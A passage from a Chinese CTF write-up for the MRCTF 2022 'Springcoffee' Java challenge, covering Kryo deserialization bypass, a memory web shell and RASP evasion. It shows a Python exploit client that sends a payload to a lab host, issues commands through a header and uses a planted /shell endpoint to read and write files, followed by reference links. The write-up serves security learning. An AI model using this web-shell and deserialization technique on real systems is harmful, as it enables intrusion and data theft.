class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_jar_file</span>(<span class="params">url, file_path, headers=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    上传 .jar 文件到指定 URL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param url: 目标服务器的 URL</span></span><br><span class="line"><span class="string">    :param file_path: 要上传的 .jar 文件路径</span></span><br><span class="line"><span class="string">    :param headers: 可选的请求头（如身份验证信息）</span></span><br><span class="line"><span class="string">    :return: 返回服务器响应</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 检查文件是否存在</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            files = &#123;<span class="string">&#x27;file&#x27;</span>: (file_path, file, <span class="string">&#x27;application/java-archive&#x27;</span>)&#125;</span><br><span class="line">            response = requests.post(url, files=files, headers=headers)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: File not found at <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">url, data=<span class="literal">None</span>, json=<span class="literal">None</span>, headers=<span class="literal">None</span></span>):</span><br><span class="line">    response = requests.post(url, data=data, json=json, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url</span>):</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readTXT</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readBin</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;whoami&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;Content-Type&quot;: &quot;application/json&quot;</span></span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html;charset=fengfff&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = readTXT(<span class="string">&quot;D://tmp//payload.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://192.168.21.132:8007/coffee/demo&quot;</span></span><br><span class="line">    json_raw = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;polish&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;References&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;RegistrationRequired&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;InstantiatorStrategy&quot;</span>: <span class="string">&quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># post(url, json=json_raw)</span></span><br><span class="line"></span><br><span class="line">    coffee_json = &#123;</span><br><span class="line">        <span class="string">&quot;extraFlavor&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;payload&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;espresso&quot;</span>: <span class="number">0.1</span></span><br><span class="line">    &#125;</span><br><span class="line">    url2 = <span class="string">&quot;http://192.168.21.132:8007/coffee/order&quot;</span></span><br><span class="line">    <span class="comment"># post(url2, json=coffee_json)</span></span><br><span class="line"></span><br><span class="line">    bin_base64 = get(<span class="string">&quot;http://192.168.21.132:8007/shell?file=/app/jrasp.jar&quot;</span>)</span><br><span class="line">    output_path = <span class="string">&quot;D://tmp//jrasp.jar&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        decoded_bin = base64.b64decode(bin_base64)</span><br><span class="line">        file.write(decoded_bin)</span><br><span class="line"></span><br><span class="line">    flag = readBin(<span class="string">&quot;D://flag&quot;</span>)</span><br><span class="line">    bwriteBase64 = base64.b64encode(flag)</span><br><span class="line">    writeBase64 = bwriteBase64.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    writePath = <span class="string">&quot;/fllag&quot;</span></span><br><span class="line">    get(<span class="string">f&quot;http://192.168.21.132:8007/shell?writePath=<span class="subst">&#123;writePath&#125;</span>&amp;writeBase64=<span class="subst">&#123;writeBase64&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题对我来说主要就是实践了一下内存马和rasp绕过，另外还有高版本kryo的绕过。题目很难，大佬们是真厉害</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>wp：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/" >2022MRCTF-Java部分<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/18/#springcoffee" >MRCTF 2022 By W&amp;M - W&amp;M Team<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.bmth666.cn/2022/11/02/RASP%E7%BB%95%E8%BF%87%E5%88%9D%E6%8E%A2/" >RASP绕过初探 | Bmth’s blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/EkiXu/My-CTF-Challenge" >EkiXu&#x2F;My-CTF-Challenge<i class="fas fa-external-link-alt"></i></a></p>
+<p>kryo：</p>
+<p>[浅析Dubbo Kryo&#x2F;FST反序列化漏洞（CVE-2021-25641） <a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/#Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" > Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a></p>
+<p>内存马：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html" >Spring内存马学习 | Bmth’s blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://landgrey.me/blog/12/" >LandGrey’s Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p>JavaAgent与Rasp：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wjlshare.com/archives/1582" >浅谈 Java Agent 内存马 – 天下大木头<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" >Java Agent 内存马学习 | Drunkbaby’s Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p>[本地命令执行漏洞 · 攻击Java Web应用-<a class="link"   target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/CMD.html" >Java Web安全]<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15311" >文章 - JAVA安全之命令执行研究分析 - 先知社区<i class="fas fa-external-link-alt"></i></a></p>
+<p>[JNI攻击 · 攻击Java Web应用-<a class="link"   target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/JNI.html" >Java Web安全]<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84-jni-%E5%88%A9%E7%94%A8" >Java 反序列化绕过 RASP - DumKiy’s blog<i class="fas fa-external-link-alt"></i></a></p>
+<p>[java Rasp 的简单实现与绕过 - Ko1sh1’s Blog](<a class="link"   target="_blank" rel="noopener" href="https://ko1sh1.github.io/2024/03/25/blog_java" >https://ko1sh1.github.io/2024/03/25/blog_java<i class="fas fa-external-link-alt"></i></a> Rasp的实现与绕过&#x2F;#JNI-绕过RASP-执行命令)</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                MRCTF22 Springcoffee
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/05/09/MRCTF22-Springcoffee/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-05-09 19:28</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF-Java-Java/">CTF-Java, Java</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/09/CISCN24%E5%86%B3%E8%B5%9B-solonMaster/"
+                                   title="CISCN24决赛-solonMaster"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">CISCN24决赛-solonMaster</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACkryo%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">高版本kryo绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="nav-number">2.2.</span> <span class="nav-text">内存马编写</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">19.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACkryo%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">高版本kryo绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="nav-number">2.2.</span> <span class="nav-text">内存马编写</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
